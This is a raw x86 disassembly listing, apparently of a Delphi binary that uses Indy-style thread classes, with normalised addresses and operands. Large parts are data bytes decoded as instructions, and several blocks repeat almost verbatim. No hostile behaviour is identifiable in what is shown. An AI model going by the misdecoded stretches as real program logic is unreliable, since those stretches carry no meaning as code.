jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_46af10
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b107
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_46b014
sub_46b10c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_41aa80
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_41aa80
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46b144
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b169
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b170
retn
sub_46b17c
enter 0x46b1 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x46b1 0x0
or al 0x0
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] dl
inc ebp
dec ecx
popad
je r-xdata
jo r-xdata
inc edx
popad
jae r-xdata
inc ecx
outsb
add [ eax ] al
in al dx
inc ecx
add [ ebx + esi - 0x1cdbffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx - 0x1c27ffbf ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov dl 0x46
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x46b22890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov dl 0x46
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esi + esi * 4 ] ch
push esp
push esp
push 0x64616572
inc ebp
js r-xdata
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc al [ ebp + 0x49 ]
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x68546449 ] bl
jb r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec esp
add [ eax ] al
add [ ecx ] cl
push esp
dec ecx
push esp
push 0x64616572
jl r-xdata
add [ eax ] ch
mov ah 0x46
add [ esp + esi * 4 ] bl
inc esi
add [ esp + esi * 4 ] ah
inc esi
inc esi
add al bl
jecxz r-xdata
push esp
push 0x64616572
xchg esp eax
mov dl 0x46
add [ eax + 0x66 ] cl
inc ecx
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
and [ ebx + 0x46 ] dh
jecxz r-xdata
popad
push esp
jb r-xdata
add [ eax ] ah
mov ah 0x46
add [ eax ] bl
mov ah 0x46
add ah bl
mov bh 0x46
add [ eax - 0x5bffb949 ] bh
mov bh 0x46
add [ ecx + ebp + 0x40 ] ch
add [ ebp + esi * 4 - 0x499bffba ] dl
inc esi
add ah al
mov dh 0x46
add al dl
mov bh 0x46
add [ ebx + esi * 4 + 0xe0046 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
mov ah 0x46
inc esi
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
and [ ebx - 0x4d53ffba ] dh
inc esi
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b40a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov bl 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x4d ] ch
inc esi
add [ eax ] ch
add [ eax ] al
dec eax
mov dl 0x46
add [ ebx + esi - 0x1cdbffc0 ] dh
inc ecx
add ah al
add [ eax ] al
add [ ecx + ebp + 0x40 ] ch
add [ 0x42644954 ] cl
push 0x64616572
mov eax eax
mov al 0xb2
inc esi
add [ edi ] al
or eax 0x42644954
popad
jae r-xdata
push esp
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] r-xdata
xchg esp eax
mov dl 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + r--data ] bl
imul ebp [ esi + 0x61 ] 0x6e416574
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax ebx
call sub_41e634
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b411
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax ebx
call sub_41e604
sub_46b428
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403738#5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_46b536
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b53d
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
xor eax eax
push ebp
push sub_46b50c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_46b4ef
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b4f6
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41e580
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub_46b54c
add [ eax ] eax
add [ eax ] al
dec esp
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
add [ eax - 0x4b ] bl
inc esi
add [ ecx - 0x173c743d ] cl
push ebx
jpo r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ac64
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push sub_46b5ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e1ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_403490
retn
dec [ ebx + 0x4289fc55 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x4c
mov edx [ ebx + 0x4 ]
call sub_403f94
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b594
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ac64
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push sub_46b5ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e1ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_403490
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b62c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov [ esi + 0xf ] 0x0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e2bc
mov eax esi
mov edx [ eax ]
call [ edx + 0x18 ]
lea eax [ esi + 0x44 ]
call sub_40d3ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46b664
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42acec
xor eax eax
push ebp
push sub_46b6ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b6c1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42acf4
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e580
sub_46b6c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42acec
xor eax eax
push ebp
push sub_46b722
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b729
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42acf4
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
sub al 0x1
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_46b72c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
call sub_42acec
xor eax eax
push ebp
push sub_46b78f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_42acf4
retn
sub_46b7fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b821
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b828
retn
sub_46b838
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ eax + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ eax + 0x3c0046 ] 0x0
add [ eax - 0x41 ] bh
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al dl
rol [ esi ] 0x8c
test [ ecx ] eax
push eax
0x84a80041 0x41
sub_46b896
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax ] cl
rol [ esi ] 0x50
rol [ esi ] 0xc
mov ecx 0xb9280046
inc esi
add [ eax ] al
retn 0x46
sub_46b928
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_465854
test al al
jne r-xdata
mov [ ebx + 0xf ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
jne r-xdata
mov eax ebx
call sub_40316c
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
mov edx ebx
mov eax [ esi + 0x30 ]
call sub_41826c
pop esi
pop ebx
retn
sub_46b968
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b98d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b994
retn
sub_46b9a0
in al dx
mov ecx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov edx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx + r--data ] bh
add [ eax ] al
cwde
popad
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
dec eax
popad
outsb
insb
jb r-xdata
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
arpl [ esi ] ax
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
dec eax
mov edx 0x12070046
push esp
dec ecx
push ebx
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x46 ] cl
add [ eax ] ch
add [ eax ] al
mov al [ 0x480046b9 ]
jb r-xdata
dec eax
popad
outsb
insb
jb r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bab0
retn
dec edi
dec eax
popad
outsb
insb
jb r-xdata
push ecx
mov esi ecx
mov ebx edx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
jb r-xdata
adc dl [ ecx + ecx * 2 + 0x64 ]
push ebx
mov ecx 0x62300046
inc esi
add [ ebx ] al
add [ ecx ] dl
dec ecx
push ebx
jb r-xdata
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx ebx
call sub_466de4
test al al
je r-xdata
jmp r-xdata
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
arpl [ esi ] ax
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc eax
add [ ebx + edi * 4 + 0x46 ] ch
add [ edi ] al
sbb [ ecx + ecx * 2 + 0x64 ] dl
push ebx
jb r-xdata
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add [ eax + 0x480046b9 ] ah
jb r-xdata
mov eax esp
call sub_40d3ac
mov edi [ esp ]
jmp r-xdata
mov eax esi
call sub_46b72c
test al al
je r-xdata
test al al
je r-xdata
jb r-xdata
add [ ecx ] al
retn
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov ecx 0x64
mov edx ebx
call sub_46713c
mov eax esi
call sub_46b72c
test al al
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx ebx
call sub_466de4
test al al
je r-xdata
call sub_4690b0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x4c ]
xor edi edi
test esi esi
je r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebx ] dh
rol bl 0x90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46baa9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
mov eax esp
call sub_40d3ac
jmp r-xdata
mov eax esp
call sub_40d3ac
jmp r-xdata
mov edi [ esp ]
jmp r-xdata
div [ esi + edx * 2 - 0x15 ]
xor eax 0x8b24048b
inc eax
push 0x64b9
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ edi ] dl
dec ecx
push ebx
jb r-xdata
mov ebx 0xba440046
inc esi
add [ ebx ] al
cmp al 0x8b
jb r-xdata
add [ ebx - 0x4aae172d ] cl
dec edi
dec eax
popad
outsb
insb
jb r-xdata
shr eax cl
call 0xffffffff8546bbae
shl [ ebp + eax - 0x75 ] 0x3c
and al 0xeb
inc ebp
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebx + 0x56 ] dl
push edi
sub_46ba02
inc ecx
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + 0x60004662 ] al
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add [ edx + edi * 4 + 0x46 ] bh
add [ eax + 0x120046ba ] al
push esp
dec ecx
push ebx
jb r-xdata
jmp r-xdata
jb r-xdata
retn
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46baa9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
dec edi
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
arpl [ esi ] ax
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
dec eax
mov edx 0x12070046
push esp
dec ecx
push ebx
dec eax
popad
outsb
insb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x46 ] cl
add [ eax ] ch
add [ eax ] al
mov al [ 0x480046b9 ]
jb r-xdata
dec eax
popad
outsb
insb
jb r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bab0
dec edi
dec eax
popad
outsb
insb
jb r-xdata
push ecx
mov esi ecx
mov ebx edx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
jb r-xdata
adc dl [ ecx + ecx * 2 + 0x64 ]
push ebx
mov ecx 0x62300046
inc esi
add [ ebx ] al
add [ ecx ] dl
dec ecx
push ebx
jb r-xdata
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx ebx
call sub_466de4
test al al
je r-xdata
jmp r-xdata
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
arpl [ esi ] ax
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc eax
add [ ebx + edi * 4 + 0x46 ] ch
add [ edi ] al
sbb [ ecx + ecx * 2 + 0x64 ] dl
push ebx
jb r-xdata
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add [ eax + 0x480046b9 ] ah
jb r-xdata
mov eax esp
call sub_40d3ac
mov edi [ esp ]
jmp r-xdata
mov eax esi
call sub_46b72c
test al al
je r-xdata
test al al
je r-xdata
jb r-xdata
add [ ecx ] al
retn
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov ecx 0x64
mov edx ebx
call sub_46713c
mov eax esi
call sub_46b72c
test al al
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx ebx
call sub_466de4
test al al
je r-xdata
call sub_4690b0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x4c ]
xor edi edi
test esi esi
je r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebx ] dh
rol bl 0x90
mov eax esp
call sub_40d3ac
jmp r-xdata
mov eax esp
call sub_40d3ac
jmp r-xdata
mov edi [ esp ]
jmp r-xdata
div [ esi + edx * 2 - 0x15 ]
xor eax 0x8b24048b
inc eax
push 0x64b9
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ edi ] dl
dec ecx
push ebx
jb r-xdata
mov ebx 0xba440046
inc esi
add [ ebx ] al
cmp al 0x8b
jb r-xdata
add [ ebx - 0x4aae172d ] cl
dec edi
dec eax
popad
outsb
insb
jb r-xdata
shr eax cl
call 0xffffffff8546bbae
shl [ ebp + eax - 0x75 ] 0x3c
and al 0xeb
inc ebp
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebx + 0x56 ] dl
push edi
sub_46babc
or [ ebx + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
mov ebx r--data
add [ eax ] al
mov al [ 0x480046b9 ]
out dx al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
dec eax
popad
outsb
insb
jb r-xdata
push ecx
mov esi ecx
mov ebx edx
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx ebx
call sub_466de4
test al al
je r-xdata
jmp r-xdata
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] bl
arpl [ esi ] ax
mov [ ebp - 0x15afffbf ] es
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
inc eax
add [ ebx + edi * 4 + 0x46 ] ch
add [ edi ] al
sbb [ ecx + ecx * 2 + 0x64 ] dl
push ebx
jb r-xdata
mov eax esp
call sub_40d3ac
mov edi [ esp ]
jmp r-xdata
mov eax esi
call sub_46b72c
test al al
je r-xdata
test al al
je r-xdata
jb r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov ecx 0x64
mov edx ebx
call sub_46713c
mov eax esi
call sub_46b72c
test al al
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x68 ]
mov edx ebx
call sub_466de4
test al al
je r-xdata
call sub_4690b0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x4c ]
xor edi edi
test esi esi
je r-xdata
dec edi
dec eax
popad
outsb
insb
jb r-xdata
mov eax esp
call sub_40d3ac
jmp r-xdata
mov eax esp
call sub_40d3ac
jmp r-xdata
mov edi [ esp ]
jmp r-xdata
div [ esi + edx * 2 - 0x15 ]
xor eax 0x8b24048b
inc eax
push 0x64b9
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ edi ] dl
dec ecx
push ebx
jb r-xdata
mov ebx 0xba440046
inc esi
add [ ebx ] al
cmp al 0x8b
jb r-xdata
add [ ebx - 0x4aae172d ] cl
dec edi
dec eax
popad
outsb
insb
jb r-xdata
shr eax cl
call 0xffffffff8546bbae
shl [ ebp + eax - 0x75 ] 0x3c
and al 0xeb
inc ebp
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ebx + 0x408dc3c0 ] cl
add [ ebx + 0x56 ] dl
push edi
sub_46bc54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bc79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc80
retn
sub_46bc8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bd60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0xc ]
call sub_404200
mov [ ebp - 0x10 ] eax
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_404544
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
sub ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404460
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd67
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f64
retn
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x7fffffff
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404460
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov ebx [ ebp - 0x10 ]
add ebx esi
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_46591c
mov esi eax
test esi esi
jg r-xdata
mov ecx ebx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
sub_46bd70
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46bea1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_404200
mov [ ebp - 0x10 ] eax
mov ebx 0x1
